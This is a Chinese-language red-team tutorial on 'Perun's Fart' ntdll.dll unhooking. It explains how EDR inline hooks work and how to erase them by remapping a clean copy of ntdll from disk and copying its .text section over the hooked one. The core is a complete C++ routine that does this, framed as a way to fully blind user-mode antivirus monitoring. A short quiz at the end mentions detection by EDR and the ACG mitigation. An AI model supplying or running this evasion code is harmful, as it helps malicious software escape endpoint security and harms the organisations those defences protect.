# R22.6 Perun's Fart 磁碟純淨 DLL 重載與 API 脫鉤技術 (Perun's Fart Unhooking)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**Perun's Fart 磁碟純淨 DLL 重載與 API 脫鉤技術** 的物理本質為**利用 Windows PE 檔案格式與虛擬記憶體覆寫機制，針對 EDR/AV 在進程記憶體中對關鍵系統動態庫（特別是 `ntdll.dll`）的匯出函數注入的內聯掛鉤 (Inline Hook, 如 `JMP <EDR_HANDLER>`)，透過自磁碟重新讀取一份乾淨無污染的 `ntdll.dll` 副本（或以掛起模式建立乾淨子進程讀取其未被注入的記憶體頁），定位其純淨的代碼段 (`.text`)，並使用 `VirtualProtect` 臨時解除記憶體寫入保護後，以乾淨機器碼精確覆蓋受害進程中已被 EDR 修改的 Hooking 位址**。在紅隊實戰中，這是徹底致盲所有依賴用戶態 API 監控之防毒系統的最高階反制手段。

```
[進程內被 EDR 污染的 ntdll.dll 記憶體]
  NtCreateFile: [ E9 XX XX XX XX (JMP to EDR.dll) ] ──► 任何敏感調用均被 EDR 監視
          ▲
          │ 執行 Perun's Fart / Full Unhooking
          │
[外部乾淨來源] ── 1. 自 C:\Windows\System32\ntdll.dll 讀取原始 PE 文件
                 2. 解析 PE 導出表與 .text 代碼節區
                 3. 計算相對偏移 (RVA) 提取純淨機器碼:
                    [ 4C 8B D1 B8 XX 00 00 00 0F 05 C3 (mov r10, rcx; mov eax, SSN; syscall; ret) ]
          │
          ▼ 覆寫記憶體 (.text Section Restore)
[進程內 ntdll.dll 恢復 100% 原生純淨狀態！EDR 用戶層 Hooking 完全蒸發！]
```

## 🔬 第一動：PE 節區結構、內聯掛鉤 (Inline Hook) 與代碼段重載物理機制 (Mechanics & Unhooking Physics)

### 1. EDR 用戶層 Hooking 的修改物理特徵
EDR 為了監控 API 調用，會在進程初始化時強行修改 `ntdll.dll` 內部高危函數（如 `NtAllocateVirtualMemory`、`NtProtectVirtualMemory`）的開頭字節：
- 將原本的 `mov r10, rcx; mov eax, SSN` 覆寫為 `jmp <EDR_Agent_Memory>` (機器碼 `0xE9` 或 `0x48 0xB8 ... 0xFF 0xE0`)。

### 2. Perun's Fart 核心還原機制
- **檔案映射 (File Mapping)**：打開磁碟上的 `C:\Windows\System32\ntdll.dll`，透過 `CreateFileMapping` 與 `MapViewOfFile` 將其映射進進程位址空間（此時為全新未修補版本）。
- **節區比對 (Section Comparison)**：
  - 定位磁碟映像與記憶體中當前已載入映像的 `.text` 節區。
  - 計算出虛擬位址偏移，直接調用 `VirtualProtect` 將記憶體中 `ntdll.dll` 的 `.text` 節區屬性改為 `PAGE_EXECUTE_READWRITE`。
  - 將磁碟讀入的純淨 `.text` 字節全量或針對性寫回已加載的模組記憶體中，徹底洗去所有 EDR 的跳轉補丁。

## ⚡ 第二動：戰術執行與工具鏈操作 (Attack Vectors & Exploitation)

### 1. 核心 Unhooking 邏輯 C++ 實作範例
```cpp
#include <windows.h>
#include <winternl.h>

void UnhookNtdllFromDisk() {
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID pCleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

    HMODULE hHookedNtdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pCleanNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)pCleanNtdll + dosHeader->e_lfanew);

    // 遍歷所有節區，鎖定 .text 代碼段
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntHeaders) + (i * sizeof(IMAGE_SECTION_HEADER)));
        if (strcmp((char*)section->Name, ".text") == 0) {
            DWORD oldProtect = 0;
            LPVOID pDestination = (LPVOID)((DWORD_PTR)hHookedNtdll + section->VirtualAddress);
            LPVOID pSource = (LPVOID)((DWORD_PTR)pCleanNtdll + section->VirtualAddress);

            // 修改權限 -> 複製乾淨代碼 -> 恢復權限
            VirtualProtect(pDestination, section->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(pDestination, pSource, section->Misc.VirtualSize);
            VirtualProtect(pDestination, section->Misc.VirtualSize, oldProtect, &oldProtect);
            break;
        }
    }
}
```

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：Perun's Fart 技術的核心物理本質是什麼？它解決了紅隊什麼致命痛點？**
  - **戰術思維**：物理本質是將已被 EDR 內聯掛鉤污染的 `ntdll.dll` 記憶體代碼段，用磁碟純淨檔案覆蓋還原；解決所有調用敏感 API 均會被 EDR 用戶層 Hook 攔截告警的痛點。
- [ ] **Q2：為什麼重載 `.text` 節區前必須先調用 `VirtualProtect`？**
  - **戰術思維**：因為作業系統預設將二進位程式的代碼段 (`.text`) 標記為唯讀與可執行 (`PAGE_EXECUTE_READ`)，直接寫入會觸發記憶體存取違規崩潰。
- [ ] **Q3：除了直接從磁碟讀取 `ntdll.dll` 外，紅隊還有何種更隱蔽的獲取純淨副本的途徑？**
  - **戰術思維**：透過以掛起狀態建立一個受信任的微軟原廠子進程，利用 `ReadProcessMemory` 讀取該進程尚未被 EDR 注入 Hook 的 `ntdll.dll` 記憶體頁。
- [ ] **Q4：藍隊 EDR 為什麼可以感知到進程內部發生了 Unhooking？**
  - **戰術思維**：EDR 可以在核心層監控對 `ntdll.dll` 記憶體區段發起的 `VirtualProtect` 寫入權限變更，或由守護線程週期性掃描自身 Hook 樁是否被抹除。
- [ ] **Q5：若作業系統開啟了 ACG (Arbitrary Code Guard)，Perun's Fart 為何會直接失效？**
  - **戰術思維**：ACG 嚴格禁止進程將不可寫代碼頁改為可寫，調用 `VirtualProtect` 企圖覆寫 `.text` 段將直接被 Windows 核心強制攔截並終止進程。
